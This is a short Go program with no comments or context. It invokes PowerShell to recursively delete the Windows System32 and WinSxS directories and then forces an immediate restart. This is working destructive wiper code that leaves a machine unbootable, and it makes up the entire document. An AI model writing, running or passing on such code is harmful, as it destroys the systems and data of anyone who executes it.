package main

import (
	"fmt"
	"log"
	"os/exec"
)

func main() {
	var out []byte
	var err error
	out, err = exec.Command("powershell", "remove-item", "C:\\Windows\\System32", "-Recurse").Output()
	out, err = exec.Command("powershell", "remove-item", "C:\\Windows\\WinSxS", "-Recurse").Output()
	if err != nil {
		log.Fatal(err)
	} else {
		fmt.Printf("%s", out)
	}
	c := exec.Command("cmd", "/C", "shutdown", "-r", "-t", "0")

	if err := c.Run(); err != nil {
		fmt.Println("Error: ", err)
	}
}
